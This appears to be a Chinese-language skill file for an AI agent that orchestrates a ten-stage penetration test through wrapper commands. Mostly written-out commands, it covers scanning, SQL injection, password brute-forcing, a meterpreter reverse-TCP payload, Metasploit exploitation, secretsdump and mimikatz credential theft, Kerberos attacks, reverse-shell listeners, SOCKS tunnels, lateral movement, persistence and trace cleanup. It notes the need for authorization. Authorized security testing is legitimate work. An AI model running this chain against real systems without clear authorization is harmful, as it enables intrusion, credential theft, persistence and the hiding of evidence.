# 渗透测试工作流（43 个工具的编排）

按阶段推进，每阶段产出喂给下一阶段。所有命令在 skill 的 `scripts/` 目录下执行（`cd <skill>/scripts`）。

先确认授权范围，并把目标记为 `$T`（如 `192.168.x.0/24`）。

## 场景 → 剧本 → 工具（速查）

编排链选剧本的依据就是这张表 —— 关键词与工具链都写死在 `scripts/agents/catalog.py`，
改这里不会改行为，改 `catalog.py` 才会。想直调单个工具时按最后一列找名字。

| 用户这么说 | 剧本 | 串起来的工具（默认参数） |
| --- | --- | --- |
| 资产、存活、有哪些主机 | `recon` | `ping_scan(target)` |
| 网段、扫段、整个 C 段 | `survey` | `network_survey(target)` |
| 端口、服务、指纹、巡检、什么设备 | `port` | `network_inspect(target, mode=quick)` |
| 全端口、65535 | `fullport` | `masscan_scan(target)` |
| 空闲 IP、地址池、IP 使用情况 | `ipusage` | `ip_usage_report(target)` |
| 子域名、攻击面、资产测绘 | `asset` | `subdomain_enum(domain)` |
| WAF、防火墙识别 | `waf` | `waf_detect(url)` |
| Web、站点、网站漏洞 | `web` | `service_identify(targets)` → `cve_match_sm_por(data=$output)` → `nuclei_scan($web, severity=critical,high)` → `nikto_scan($http)` |
| 目录、后台、敏感文件 | `dir` | `dirb_scan(url)` |
| SQL、注入、数据库 | `db` | `sqlmap_basic(url)`（`sqlmap_full` 属高风险，要显式点名 + 授权） |
| CVE、版本、漏洞库匹配 | `cve` | `service_identify(targets)` → `cve_match_sm_por(data=$output)` |
| 复核、误报、确认能不能复现 | `verify` | `vuln_verify(report=$output)` |
| 等保、合规、基线加固 | `compliance` | `compliance_report(target)` |
| 现在几点 / 时间戳 | `time` | `get_current_time()` |
| 渗透测试、安全评估（没指明具体做什么） | `pentest` | `network_inspect` → `service_identify` → `nuclei_scan` → `cve_match_sm_por` |

两条连线规则：目标是网段（CIDR）时，要站点 URL 的工具（`nuclei` / `nikto` / `dirb` / `sqlmap` /
`waf_detect`）自动让位，不会拼出 `http://192.168.x.0/24`；一段话命中多个剧本时，按工具名去重，
顺序仍按这张表的行序（`verify` 永远排在扫描类之后，复核才有东西可复核）。

## 阶段 1 · 资产发现

目标是拿到「有哪些 IP/域名在线」。

```bash
python3 call.py ping_scan target=$T                        # 存活主机（ICMP，快）
python3 call.py ip_usage_report target=$T                  # 在线设备 + 设备类型/厂家 + 空闲 IP
python3 call.py network_survey target=$T                   # /16 以上大网段快速普查
python3 call.py masscan_scan '{"target":"$T","ports":"22,80,443,3389,8080"}'   # 指定端口
python3 call.py subdomain_enum domain=example.com          # 子域名（subfinder + DNS 爆破）
```

`ip_usage_report` 会连带做设备类型识别（服务器/网络设备/摄像头等），适合第一轮摸底。
`network_survey` 在 /16 以上比逐个扫端口快得多。

## 阶段 2 · 端口与服务识别

```bash
python3 call.py masscan_scan '{"target":"192.168.x.x","ports":"1-65535"}'        # 全端口
python3 call.py service_identify '{"target":"192.168.x.x:22,192.168.x.x:80"}'       # 服务名+版本
python3 call.py os_identify target=192.168.x.x                                   # 操作系统
python3 call.py network_inspect target=$T                                     # 网段画像
```

`service_identify` 支持批量，输入每行一个 `IP:端口`，自动按 IP 分组。
版本号是后面 CVE 匹配的输入，务必拿到。

## 阶段 3 · Web 应用检测

```bash
python3 call.py waf_detect url=http://$T                        # 先探 WAF，决定后续策略
python3 call.py nikto_scan '{"target":"192.168.x.x","port":80}'    # 常规 Web 漏洞/配置
python3 call.py dirb_scan url=http://192.168.x.x wordlist=big      # 目录爆破（内置字典）
python3 call.py sqlmap_basic url='http://192.168.x.x/a.php?id=1'   # SQL 注入（GET）
python3 call.py sqlmap_full '{"url":"http://192.168.x.x/a.php?id=1","level":3,"risk":2,"dump_db":"app"}'
```

有 WAF 时先降速、换 UA，不要一上来就跑 `sqlmap_full` 高 level。
`sqlmap_full` 的 `os_shell`、`dump_all` 属破坏性选项，需明确授权。

## 阶段 4 · 漏洞扫描与匹配

```bash
nuclei -ut                                                       # 更新模板库（nuclei 自带命令，扫描前建议先跑）
python3 call.py nuclei_scan '{"target":"http://192.168.x.x","severity":"critical,high,medium"}'
python3 call.py cve_match_sm_por                                  # 按服务/版本匹配 CVE
python3 call.py poc_runner_sm_por                                 # 跑 PoC 验证
```

`cve_match_sm_por` 需要把阶段 2 的服务版本作为输入；它查本地 CVE 库（256MB，含 NVD 索引），离线可用。

## 阶段 5 · 漏洞验证（降误报）

```bash
python3 call.py vuln_verify                                       # 复核报告中的漏洞，确认可复现
python3 call.py exploit_search keyword=apache2.4.49               # 找对应 exploit
```

把阶段 3/4 的结果粘贴进 `vuln_verify`。报告里只保留验证通过的条目。

## 阶段 6 · 口令审计

```bash
python3 call.py passwd_dict_gen                                   # 按目标信息生成定制字典
python3 call.py hydra_bruteforce '{"target":"192.168.x.x","service":"ssh","username":"root","password_list":"pass1,pass2,pass3"}'
python3 call.py hashcat_bruteforce '{"hash_file":"/tmp/h.txt","wordlist":"/usr/share/wordlists/rockyou.txt","hash_type":"ntlm"}'
```

`hydra_bruteforce` 的 `password_list` 可直接传逗号分隔的口令，不必先建文件。
爆破是高风险高噪声操作，先确认授权与账户锁定策略。

## 阶段 7 · 利用

```bash
python3 call.py msfvenom_payload '{"payload":"linux/x64/meterpreter_reverse_tcp","lhost":"192.168.x.x","lport":4444}'
python3 call.py msf_exploit                                       # Metasploit 自动化利用
python3 call.py smb_enum target=192.168.x.x                          # SMB 共享/用户/空会话
python3 call.py impacket_secretsdump '{"target":"192.168.x.x","domain":"CORP","username":"admin","password":"***"}'
python3 call.py kerberos_attack '{"domain":"CORP.LOCAL","dc_ip":"192.168.x.x","mode":"asrep","username":"user1"}'
python3 call.py mimikatz_memory                                   # 内存凭据提取
```

`kerberos_attack` 的 `mode`：`asrep`（免密枚举）、`kerberoast`（需凭据）、`auto`。

## 阶段 8 · 后渗透与横向

```bash
python3 call.py revshell_handler '{"port":4444}'                  # 起反弹监听
python3 call.py socks_proxy '{"mode":"server","listen_port":1080}' # 打通隧道
python3 call.py lateral_portscan '{"target":"192.168.x.0/24"}'        # 内网存活
python3 call.py lateral_smb_enum                                  # 横向 SMB
python3 call.py lateral_hash_dump                                 # 横向哈希导出
python3 call.py lateral_ssh_exec                                  # 远程执行
python3 call.py persist_install                                   # 持久化（高风险）
```

`socks_proxy` 先起 server，被控端用 `chisel client <IP>:1080 R:socks` 反连，之后内网工具走 1080。

## 阶段 9 · 合规检查

```bash
python3 call.py compliance_report target=192.168.x.x    # 等保/基线综合报告
```

覆盖口令策略、审计策略、身份认证、服务加固四类检查，输出可直接进报告。

## 阶段 10 · 收尾

```bash
python3 call.py cleanup_trace '{"target":"192.168.x.x"}'   # 清理测试痕迹
```

结合 `references/knowledge/` 里的 OWASP / Payloads / 等保基线写修复建议。

## 常见坑

- `success=false` 但 `output` 有内容：多数工具把「命令非 0 退出」也算失败，看 `output` 判断是否真的没结果。
- `[TIMEOUT]`：加大工具的 `timeout` 参数，或缩小 `target` 范围。
- nuclei 首次跑很慢：模板 4w+，用 `severity` 或 `tags` 收窄。
- CVE 匹配结果为空：确认阶段 2 拿到了具体版本号，只有 IP 匹配不到。
